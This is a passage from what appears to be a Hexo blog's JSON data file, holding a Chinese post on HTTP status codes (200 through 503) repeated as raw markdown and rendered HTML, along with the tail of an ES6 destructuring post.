class=\"line\"> // 只想获取键值</span><br><span class=\"line\"> for (const [,value] of map) &#123;</span><br><span class=\"line\">  //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"引入模块中的某些方法\"><a href=\"#引入模块中的某些方法\" class=\"headerlink\" title=\"引入模块中的某些方法\"></a>引入模块中的某些方法</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cosnt &#123;sourceMapConsumer,SourceNode&#125; = require(&#x27;source-map&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://es6.ruanyifeng.com/#docs/destructuring\">阮一峰《ES6 标准》</a></p>\n"},{"title":"HTTP状态码","date":"2019-04-16T02:36:51.000Z","_content":"\n# HTTP 作用\n\n- 表示客户端 HTTP 请求的返回结果\n- 标记服务器端处理是否正常\n- 通知出现的错误\n  ![code](HTTP状态码/code.jpg)\n\n## 组成\n\n以 **3 位数字**和**原因短语**组成\n\n```\n200 OK\n```\n\n数字中的第一位指定了响应类别，响应类别分为以下 5 种：\n\n- 1XX\n- 2XX\n- 3XX\n- 4XX\n- 5XX\n\n| 状态码 | 类别                           | 原因短语                   |\n| ------ | :----------------------------- | :------------------------- |\n| 1XX    | Informational(信息性状态码)    | 接收的请求正在处理         |\n| 2XX    | Success(成功状态码)            | 请求正常处理完毕           |\n| 3XX    | Redirection(重定向状态码)      | 需要进行附加操作已完成请求 |\n| 4XX    | Client Error(客户端错误状态码) | 服务器无法处理请求         |\n| 5XX    | Server Error(服务端错误状态码) | 服务器处理请求错误         |\n\n下面介绍常用的 14 种状态码\n\n### 2XX\n\n#### 200 OK (成功)\n\n![200](HTTP状态码/200.jpg)\n\n**表示客户端发来的请求在服务器端被正常处理了**\n在响应报文中，随状态码返回的信息会因为请求方法的不同，而发生改变\nGET 方法，返回首部和请求资源的实体\nHEAD 方法，只返回首部，不返回实体的主体部分\n\n**HTTP 报文：**\n\n```\n-----------------\n报文首部\n-----------------\n空行（CR+LF）\n-----------------\n报文主体\n-----------------\n```\n\n**报文主体与实体主体的区别：**\n\n通常情况下，报文主体等于实体主体\n只有在传输中进行编码操作时，实体主体的内容会发生变化，才导致实体主体和报文主体产生差异\n传输中不进行编码，报文主体 = 实体主体\n传输中若进行编码，报文主体 ≠ 实体主体\n\n#### 204 No Content （没有实体主体）\n\n![204](HTTP状态码/204.jpg)\n\n表示**服务器接受的请求已处理成功，但在返回的响应报文中不含实体主体部分**（也不允许返回任何实体的主体）\n即，客户端发送的请求，服务端正常处理了，但是没有返回主体给客户端，所以，浏览器显示的页面不会发生变化\n\n#### 206 Partial Content\n\n![206](HTTP状态码/206.jpg)\n\n**表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求**\n响应报文中包含**Content-Range 制定范围的实体内容**\n\n### 3XX 重定向\n\n#### 301 Moved Permanently （永久性重定向）\n\n![301](HTTP状态码/301.jpg)\n\n表示请求的资源已被分配了新的 URI，以后应该是用该资源新的 URI\n如：如果请求资源路径的最后忘记加斜杠 “/”,就会产生 301 状态码\n\n#### 302 Found （临时性重定向）\n\n![302](HTTP状态码/302.jpg)\n\n表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问\n\n**301 与 302 的区别**\n301 表示资源分配了新的 URI 是永久性的\n302 表示这是临时的，也就是说，已移动的资源对应的 URI 将来还有可能发生改变\n比如：用户将 URI 保存为书签，但不会返回 301 状态码提醒用户去更新书签，而是依旧保留的是原来的 URI（导致返回 302 状态码的 URI）\n\n#### 303 See Other\n\n![303](HTTP状态码/303.jpg)\n\n表示请求对应的资源存在着另一个 URI，应使用 GET 定向获取请求的资源\n**303 与 302 功能相似，区别在于 303 明确表示客户端应使用 GET 方法获取球资源**\n\n**_注意_：**\n\n当 301、302、303 响应状态码返回时，几乎所有浏览器都会把 POST 改成 GET，并删除请求报文主体，之后请求会自动再次发送，\n虽然 301、302 标准是禁止将 POST 改为 GET，但是，实际使用中大家都没有准守\n\n#### 304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）\n\n![304](HTTP状态码/304.jpg)\n\n表示客户端发送附带条件的请求时，服务器允许请求访问资源，但是因请求未满足条件的情况后，直接返回 304\n304 Not Modified（服务端资源未改变，可直接使用客户端未过期的缓存），304 状态码返回时，不包含人挪活而响应的主体部分\n\n#### 307 Temporary Redirect（临时重定向）\n\n与 302 类似，但是 307 会准守标准，不会从 POST 变成 GET（具体每个浏览器反应会不一样）\n\n### 4XX 客户端错误\n\n#### 400 Bad Request\n\n![400](HTTP状态码/400.jpg)\n表示请求报文中存在语法错误（一般是请求参数不正确）\n\n#### 401 Unauthorized\n\n![401](HTTP状态码/401.jpg)\n\n表示请求需要通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息\n\n#### 403 Forbidden\n\n![403](HTTP状态码/403.jpg)\n\n表示对请求的资源被服务器拒绝了\n如：未获得文件系统的访问授权、\n从未授权的发送源 IP 地址访问\n\n#### 404 Not Found\n\n![404](HTTP状态码/404.jpg)\n\n表示服务器上没有请求的资源\n\n### 5XX 服务器错误\n\n#### 500 Internet Server Error\n\n![500](HTTP状态码/500.jpg)\n\n表示服务器在执行请求时发生了错误，也可能是 Web 应用存在 bug 或某些临时故障\n\n#### 503 Service Unavailable\n\n![503](HTTP状态码/502.jpg)\n\n表示服务器这暂时处于超负载或则会正在停机维修中，现在无法处理请求\n\n#### 参考资料\n\n[图解 HTTP](https://book.douban.com/subject/25863515/)\n","source":"_posts/HTTP状态码.md","raw":"---\ntitle: HTTP状态码\ndate: 2019-04-16 10:36:51\ntags:\n---\n\n# HTTP 作用\n\n- 表示客户端 HTTP 请求的返回结果\n- 标记服务器端处理是否正常\n- 通知出现的错误\n  ![code](HTTP状态码/code.jpg)\n\n## 组成\n\n以 **3 位数字**和**原因短语**组成\n\n```\n200 OK\n```\n\n数字中的第一位指定了响应类别，响应类别分为以下 5 种：\n\n- 1XX\n- 2XX\n- 3XX\n- 4XX\n- 5XX\n\n| 状态码 | 类别                           | 原因短语                   |\n| ------ | :----------------------------- | :------------------------- |\n| 1XX    | Informational(信息性状态码)    | 接收的请求正在处理         |\n| 2XX    | Success(成功状态码)            | 请求正常处理完毕           |\n| 3XX    | Redirection(重定向状态码)      | 需要进行附加操作已完成请求 |\n| 4XX    | Client Error(客户端错误状态码) | 服务器无法处理请求         |\n| 5XX    | Server Error(服务端错误状态码) | 服务器处理请求错误         |\n\n下面介绍常用的 14 种状态码\n\n### 2XX\n\n#### 200 OK (成功)\n\n![200](HTTP状态码/200.jpg)\n\n**表示客户端发来的请求在服务器端被正常处理了**\n在响应报文中，随状态码返回的信息会因为请求方法的不同，而发生改变\nGET 方法，返回首部和请求资源的实体\nHEAD 方法，只返回首部，不返回实体的主体部分\n\n**HTTP 报文：**\n\n```\n-----------------\n报文首部\n-----------------\n空行（CR+LF）\n-----------------\n报文主体\n-----------------\n```\n\n**报文主体与实体主体的区别：**\n\n通常情况下，报文主体等于实体主体\n只有在传输中进行编码操作时，实体主体的内容会发生变化，才导致实体主体和报文主体产生差异\n传输中不进行编码，报文主体 = 实体主体\n传输中若进行编码，报文主体 ≠ 实体主体\n\n#### 204 No Content （没有实体主体）\n\n![204](HTTP状态码/204.jpg)\n\n表示**服务器接受的请求已处理成功，但在返回的响应报文中不含实体主体部分**（也不允许返回任何实体的主体）\n即，客户端发送的请求，服务端正常处理了，但是没有返回主体给客户端，所以，浏览器显示的页面不会发生变化\n\n#### 206 Partial Content\n\n![206](HTTP状态码/206.jpg)\n\n**表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求**\n响应报文中包含**Content-Range 制定范围的实体内容**\n\n### 3XX 重定向\n\n#### 301 Moved Permanently （永久性重定向）\n\n![301](HTTP状态码/301.jpg)\n\n表示请求的资源已被分配了新的 URI，以后应该是用该资源新的 URI\n如：如果请求资源路径的最后忘记加斜杠 “/”,就会产生 301 状态码\n\n#### 302 Found （临时性重定向）\n\n![302](HTTP状态码/302.jpg)\n\n表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问\n\n**301 与 302 的区别**\n301 表示资源分配了新的 URI 是永久性的\n302 表示这是临时的，也就是说，已移动的资源对应的 URI 将来还有可能发生改变\n比如：用户将 URI 保存为书签，但不会返回 301 状态码提醒用户去更新书签，而是依旧保留的是原来的 URI（导致返回 302 状态码的 URI）\n\n#### 303 See Other\n\n![303](HTTP状态码/303.jpg)\n\n表示请求对应的资源存在着另一个 URI，应使用 GET 定向获取请求的资源\n**303 与 302 功能相似，区别在于 303 明确表示客户端应使用 GET 方法获取球资源**\n\n**_注意_：**\n\n当 301、302、303 响应状态码返回时，几乎所有浏览器都会把 POST 改成 GET，并删除请求报文主体，之后请求会自动再次发送，\n虽然 301、302 标准是禁止将 POST 改为 GET，但是，实际使用中大家都没有准守\n\n#### 304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）\n\n![304](HTTP状态码/304.jpg)\n\n表示客户端发送附带条件的请求时，服务器允许请求访问资源，但是因请求未满足条件的情况后，直接返回 304\n304 Not Modified（服务端资源未改变，可直接使用客户端未过期的缓存），304 状态码返回时，不包含人挪活而响应的主体部分\n\n#### 307 Temporary Redirect（临时重定向）\n\n与 302 类似，但是 307 会准守标准，不会从 POST 变成 GET（具体每个浏览器反应会不一样）\n\n### 4XX 客户端错误\n\n#### 400 Bad Request\n\n![400](HTTP状态码/400.jpg)\n表示请求报文中存在语法错误（一般是请求参数不正确）\n\n#### 401 Unauthorized\n\n![401](HTTP状态码/401.jpg)\n\n表示请求需要通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息\n\n#### 403 Forbidden\n\n![403](HTTP状态码/403.jpg)\n\n表示对请求的资源被服务器拒绝了\n如：未获得文件系统的访问授权、\n从未授权的发送源 IP 地址访问\n\n#### 404 Not Found\n\n![404](HTTP状态码/404.jpg)\n\n表示服务器上没有请求的资源\n\n### 5XX 服务器错误\n\n#### 500 Internet Server Error\n\n![500](HTTP状态码/500.jpg)\n\n表示服务器在执行请求时发生了错误，也可能是 Web 应用存在 bug 或某些临时故障\n\n#### 503 Service Unavailable\n\n![503](HTTP状态码/502.jpg)\n\n表示服务器这暂时处于超负载或则会正在停机维修中，现在无法处理请求\n\n#### 参考资料\n\n[图解 HTTP](https://book.douban.com/subject/25863515/)\n","slug":"HTTP状态码","published":1,"updated":"2022-02-23T03:09:02.854Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950ct0006n0w110srfcye","content":"<h1 id=\"HTTP-作用\"><a href=\"#HTTP-作用\" class=\"headerlink\" title=\"HTTP 作用\"></a>HTTP 作用</h1><ul>\n<li>表示客户端 HTTP 请求的返回结果</li>\n<li>标记服务器端处理是否正常</li>\n<li>通知出现的错误<br><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/code.jpg\" alt=\"code\"></li>\n</ul>\n<h2 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h2><p>以 <strong>3 位数字</strong>和<strong>原因短语</strong>组成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">200 OK</span><br></pre></td></tr></table></figure>\n\n<p>数字中的第一位指定了响应类别，响应类别分为以下 5 种：</p>\n<ul>\n<li>1XX</li>\n<li>2XX</li>\n<li>3XX</li>\n<li>4XX</li>\n<li>5XX</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>状态码</th>\n<th align=\"left\">类别</th>\n<th align=\"left\">原因短语</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1XX</td>\n<td align=\"left\">Informational(信息性状态码)</td>\n<td align=\"left\">接收的请求正在处理</td>\n</tr>\n<tr>\n<td>2XX</td>\n<td align=\"left\">Success(成功状态码)</td>\n<td align=\"left\">请求正常处理完毕</td>\n</tr>\n<tr>\n<td>3XX</td>\n<td align=\"left\">Redirection(重定向状态码)</td>\n<td align=\"left\">需要进行附加操作已完成请求</td>\n</tr>\n<tr>\n<td>4XX</td>\n<td align=\"left\">Client Error(客户端错误状态码)</td>\n<td align=\"left\">服务器无法处理请求</td>\n</tr>\n<tr>\n<td>5XX</td>\n<td align=\"left\">Server Error(服务端错误状态码)</td>\n<td align=\"left\">服务器处理请求错误</td>\n</tr>\n</tbody></table>\n<p>下面介绍常用的 14 种状态码</p>\n<h3 id=\"2XX\"><a href=\"#2XX\" class=\"headerlink\" title=\"2XX\"></a>2XX</h3><h4 id=\"200-OK-成功\"><a href=\"#200-OK-成功\" class=\"headerlink\" title=\"200 OK (成功)\"></a>200 OK (成功)</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/200.jpg\" alt=\"200\"></p>\n<p><strong>表示客户端发来的请求在服务器端被正常处理了</strong><br>在响应报文中，随状态码返回的信息会因为请求方法的不同，而发生改变<br>GET 方法，返回首部和请求资源的实体<br>HEAD 方法，只返回首部，不返回实体的主体部分</p>\n<p><strong>HTTP 报文：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------</span><br><span class=\"line\">报文首部</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">空行（CR+LF）</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">报文主体</span><br><span class=\"line\">-----------------</span><br></pre></td></tr></table></figure>\n\n<p><strong>报文主体与实体主体的区别：</strong></p>\n<p>通常情况下，报文主体等于实体主体<br>只有在传输中进行编码操作时，实体主体的内容会发生变化，才导致实体主体和报文主体产生差异<br>传输中不进行编码，报文主体 = 实体主体<br>传输中若进行编码，报文主体 ≠ 实体主体</p>\n<h4 id=\"204-No-Content-（没有实体主体）\"><a href=\"#204-No-Content-（没有实体主体）\" class=\"headerlink\" title=\"204 No Content （没有实体主体）\"></a>204 No Content （没有实体主体）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/204.jpg\" alt=\"204\"></p>\n<p>表示<strong>服务器接受的请求已处理成功，但在返回的响应报文中不含实体主体部分</strong>（也不允许返回任何实体的主体）<br>即，客户端发送的请求，服务端正常处理了，但是没有返回主体给客户端，所以，浏览器显示的页面不会发生变化</p>\n<h4 id=\"206-Partial-Content\"><a href=\"#206-Partial-Content\" class=\"headerlink\" title=\"206 Partial Content\"></a>206 Partial Content</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/206.jpg\" alt=\"206\"></p>\n<p><strong>表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求</strong><br>响应报文中包含<strong>Content-Range 制定范围的实体内容</strong></p>\n<h3 id=\"3XX-重定向\"><a href=\"#3XX-重定向\" class=\"headerlink\" title=\"3XX 重定向\"></a>3XX 重定向</h3><h4 id=\"301-Moved-Permanently-（永久性重定向）\"><a href=\"#301-Moved-Permanently-（永久性重定向）\" class=\"headerlink\" title=\"301 Moved Permanently （永久性重定向）\"></a>301 Moved Permanently （永久性重定向）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/301.jpg\" alt=\"301\"></p>\n<p>表示请求的资源已被分配了新的 URI，以后应该是用该资源新的 URI<br>如：如果请求资源路径的最后忘记加斜杠 “/”,就会产生 301 状态码</p>\n<h4 id=\"302-Found-（临时性重定向）\"><a href=\"#302-Found-（临时性重定向）\" class=\"headerlink\" title=\"302 Found （临时性重定向）\"></a>302 Found （临时性重定向）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/302.jpg\" alt=\"302\"></p>\n<p>表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问</p>\n<p><strong>301 与 302 的区别</strong><br>301 表示资源分配了新的 URI 是永久性的<br>302 表示这是临时的，也就是说，已移动的资源对应的 URI 将来还有可能发生改变<br>比如：用户将 URI 保存为书签，但不会返回 301 状态码提醒用户去更新书签，而是依旧保留的是原来的 URI（导致返回 302 状态码的 URI）</p>\n<h4 id=\"303-See-Other\"><a href=\"#303-See-Other\" class=\"headerlink\" title=\"303 See Other\"></a>303 See Other</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/303.jpg\" alt=\"303\"></p>\n<p>表示请求对应的资源存在着另一个 URI，应使用 GET 定向获取请求的资源<br><strong>303 与 302 功能相似，区别在于 303 明确表示客户端应使用 GET 方法获取球资源</strong></p>\n<p><strong>_注意_：</strong></p>\n<p>当 301、302、303 响应状态码返回时，几乎所有浏览器都会把 POST 改成 GET，并删除请求报文主体，之后请求会自动再次发送，<br>虽然 301、302 标准是禁止将 POST 改为 GET，但是，实际使用中大家都没有准守</p>\n<h4 id=\"304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）\"><a href=\"#304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）\" class=\"headerlink\" title=\"304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）\"></a>304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/304.jpg\" alt=\"304\"></p>\n<p>表示客户端发送附带条件的请求时，服务器允许请求访问资源，但是因请求未满足条件的情况后，直接返回 304<br>304 Not Modified（服务端资源未改变，可直接使用客户端未过期的缓存），304 状态码返回时，不包含人挪活而响应的主体部分</p>\n<h4 id=\"307-Temporary-Redirect（临时重定向）\"><a href=\"#307-Temporary-Redirect（临时重定向）\" class=\"headerlink\" title=\"307 Temporary Redirect（临时重定向）\"></a>307 Temporary Redirect（临时重定向）</h4><p>与 302 类似，但是 307 会准守标准，不会从 POST 变成 GET（具体每个浏览器反应会不一样）</p>\n<h3 id=\"4XX-客户端错误\"><a href=\"#4XX-客户端错误\" class=\"headerlink\" title=\"4XX 客户端错误\"></a>4XX 客户端错误</h3><h4 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/400.jpg\" alt=\"400\"><br>表示请求报文中存在语法错误（一般是请求参数不正确）</p>\n<h4 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/401.jpg\" alt=\"401\"></p>\n<p>表示请求需要通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息</p>\n<h4 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/403.jpg\" alt=\"403\"></p>\n<p>表示对请求的资源被服务器拒绝了<br>如：未获得文件系统的访问授权、<br>从未授权的发送源 IP 地址访问</p>\n<h4 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/404.jpg\" alt=\"404\"></p>\n<p>表示服务器上没有请求的资源</p>\n<h3 id=\"5XX-服务器错误\"><a href=\"#5XX-服务器错误\" class=\"headerlink\" title=\"5XX 服务器错误\"></a>5XX 服务器错误</h3><h4 id=\"500-Internet-Server-Error\"><a href=\"#500-Internet-Server-Error\" class=\"headerlink\" title=\"500 Internet Server Error\"></a>500 Internet Server Error</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/500.jpg\" alt=\"500\"></p>\n<p>表示服务器在执行请求时发生了错误，也可能是 Web 应用存在 bug 或某些临时故障</p>\n<h4 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/502.jpg\" alt=\"503\"></p>\n<p>表示服务器这暂时处于超负载或则会正在停机维修中，现在无法处理请求</p>\n<h4 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h4><p><a href=\"https://book.douban.com/subject/25863515/\">图解 HTTP</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTP-作用\"><a href=\"#HTTP-作用\" class=\"headerlink\" title=\"HTTP 作用\"></a>HTTP 作用</h1><ul>\n<li>表示客户端 HTTP 请求的返回结果</li>\n<li>标记服务器端处理是否正常</li>\n<li>通知出现的错误<br><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/code.jpg\" alt=\"code\"></li>\n</ul>\n<h2 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h2><p>以 <strong>3 位数字</strong>和<strong>原因短语</strong>组成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">200 OK</span><br></pre></td></tr></table></figure>\n\n<p>数字中的第一位指定了响应类别，响应类别分为以下 5 种：</p>\n<ul>\n<li>1XX</li>\n<li>2XX</li>\n<li>3XX</li>\n<li>4XX</li>\n<li>5XX</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>状态码</th>\n<th align=\"left\">类别</th>\n<th align=\"left\">原因短语</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1XX</td>\n<td align=\"left\">Informational(信息性状态码)</td>\n<td align=\"left\">接收的请求正在处理</td>\n</tr>\n<tr>\n<td>2XX</td>\n<td align=\"left\">Success(成功状态码)</td>\n<td align=\"left\">请求正常处理完毕</td>\n</tr>\n<tr>\n<td>3XX</td>\n<td align=\"left\">Redirection(重定向状态码)</td>\n<td align=\"left\">需要进行附加操作已完成请求</td>\n</tr>\n<tr>\n<td>4XX</td>\n<td align=\"left\">Client Error(客户端错误状态码)</td>\n<td align=\"left\">服务器无法处理请求</td>\n</tr>\n<tr>\n<td>5XX</td>\n<td align=\"left\">Server Error(服务端错误状态码)</td>\n<td align=\"left\">服务器处理请求错误</td>\n</tr>\n</tbody></table>\n<p>下面介绍常用的 14 种状态码</p>\n<h3 id=\"2XX\"><a href=\"#2XX\" class=\"headerlink\" title=\"2XX\"></a>2XX</h3><h4 id=\"200-OK-成功\"><a href=\"#200-OK-成功\" class=\"headerlink\" title=\"200 OK (成功)\"></a>200 OK (成功)</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/200.jpg\" alt=\"200\"></p>\n<p><strong>表示客户端发来的请求在服务器端被正常处理了</strong><br>在响应报文中，随状态码返回的信息会因为请求方法的不同，而发生改变<br>GET 方法，返回首部和请求资源的实体<br>HEAD 方法，只返回首部，不返回实体的主体部分</p>\n<p><strong>HTTP 报文：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------</span><br><span class=\"line\">报文首部</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">空行（CR+LF）</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">报文主体</span><br><span class=\"line\">-----------------</span><br></pre></td></tr></table></figure>\n\n<p><strong>报文主体与实体主体的区别：</strong></p>\n<p>通常情况下，报文主体等于实体主体<br>只有在传输中进行编码操作时，实体主体的内容会发生变化，才导致实体主体和报文主体产生差异<br>传输中不进行编码，报文主体 = 实体主体<br>传输中若进行编码，报文主体 ≠ 实体主体</p>\n<h4 id=\"204-No-Content-（没有实体主体）\"><a href=\"#204-No-Content-（没有实体主体）\" class=\"headerlink\" title=\"204 No Content （没有实体主体）\"></a>204 No Content （没有实体主体）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/204.jpg\" alt=\"204\"></p>\n<p>表示<strong>服务器接受的请求已处理成功，但在返回的响应报文中不含实体主体部分</strong>（也不允许返回任何实体的主体）<br>即，客户端发送的请求，服务端正常处理了，但是没有返回主体给客户端，所以，浏览器显示的页面不会发生变化</p>\n<h4 id=\"206-Partial-Content\"><a href=\"#206-Partial-Content\" class=\"headerlink\" title=\"206 Partial Content\"></a>206 Partial Content</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/206.jpg\" alt=\"206\"></p>\n<p><strong>表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求</strong><br>响应报文中包含<strong>Content-Range 制定范围的实体内容</strong></p>\n<h3 id=\"3XX-重定向\"><a href=\"#3XX-重定向\" class=\"headerlink\" title=\"3XX 重定向\"></a>3XX 重定向</h3><h4 id=\"301-Moved-Permanently-（永久性重定向）\"><a href=\"#301-Moved-Permanently-（永久性重定向）\" class=\"headerlink\" title=\"301 Moved Permanently （永久性重定向）\"></a>301 Moved Permanently （永久性重定向）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/301.jpg\" alt=\"301\"></p>\n<p>表示请求的资源已被分配了新的 URI，以后应该是用该资源新的 URI<br>如：如果请求资源路径的最后忘记加斜杠 “/”,就会产生 301 状态码</p>\n<h4 id=\"302-Found-（临时性重定向）\"><a href=\"#302-Found-（临时性重定向）\" class=\"headerlink\" title=\"302 Found （临时性重定向）\"></a>302 Found （临时性重定向）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/302.jpg\" alt=\"302\"></p>\n<p>表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问</p>\n<p><strong>301 与 302 的区别</strong><br>301 表示资源分配了新的 URI 是永久性的<br>302 表示这是临时的，也就是说，已移动的资源对应的 URI 将来还有可能发生改变<br>比如：用户将 URI 保存为书签，但不会返回 301 状态码提醒用户去更新书签，而是依旧保留的是原来的 URI（导致返回 302 状态码的 URI）</p>\n<h4 id=\"303-See-Other\"><a href=\"#303-See-Other\" class=\"headerlink\" title=\"303 See Other\"></a>303 See Other</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/303.jpg\" alt=\"303\"></p>\n<p>表示请求对应的资源存在着另一个 URI，应使用 GET 定向获取请求的资源<br><strong>303 与 302 功能相似，区别在于 303 明确表示客户端应使用 GET 方法获取球资源</strong></p>\n<p><strong>_注意_：</strong></p>\n<p>当 301、302、303 响应状态码返回时，几乎所有浏览器都会把 POST 改成 GET，并删除请求报文主体，之后请求会自动再次发送，<br>虽然 301、302 标准是禁止将 POST 改为 GET，但是，实际使用中大家都没有准守</p>\n<h4 id=\"304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）\"><a href=\"#304-Not-Modified（虽然划在-3XX-类别中，但是与重定向无关）\" class=\"headerlink\" title=\"304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）\"></a>304 Not Modified（虽然划在 3XX 类别中，但是与重定向无关）</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/304.jpg\" alt=\"304\"></p>\n<p>表示客户端发送附带条件的请求时，服务器允许请求访问资源，但是因请求未满足条件的情况后，直接返回 304<br>304 Not Modified（服务端资源未改变，可直接使用客户端未过期的缓存），304 状态码返回时，不包含人挪活而响应的主体部分</p>\n<h4 id=\"307-Temporary-Redirect（临时重定向）\"><a href=\"#307-Temporary-Redirect（临时重定向）\" class=\"headerlink\" title=\"307 Temporary Redirect（临时重定向）\"></a>307 Temporary Redirect（临时重定向）</h4><p>与 302 类似，但是 307 会准守标准，不会从 POST 变成 GET（具体每个浏览器反应会不一样）</p>\n<h3 id=\"4XX-客户端错误\"><a href=\"#4XX-客户端错误\" class=\"headerlink\" title=\"4XX 客户端错误\"></a>4XX 客户端错误</h3><h4 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/400.jpg\" alt=\"400\"><br>表示请求报文中存在语法错误（一般是请求参数不正确）</p>\n<h4 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/401.jpg\" alt=\"401\"></p>\n<p>表示请求需要通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息</p>\n<h4 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/403.jpg\" alt=\"403\"></p>\n<p>表示对请求的资源被服务器拒绝了<br>如：未获得文件系统的访问授权、<br>从未授权的发送源 IP 地址访问</p>\n<h4 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h4><p><img src=\"HTTP%E7%8A%B6%E6%80%81%E7%A0%81/404.jpg\" alt=\"404\"></p>\n<p>表示服务器上没有请求的资源</p>\n<h3 id=\"5XX-服务器错误\"><a href=\"#5XX-服务器错误\" class=\"headerlink\" title=\"5XX 服务器错误\"></a>5XX 服务器错误</h3><h4 id=\"500-Internet-Server-Error\"><a href=\"#500-Internet-Server-Error\" class=\"headerlink\" title=\"500 Internet Server Error\"></a>500 Internet Server Error</h4><p><img 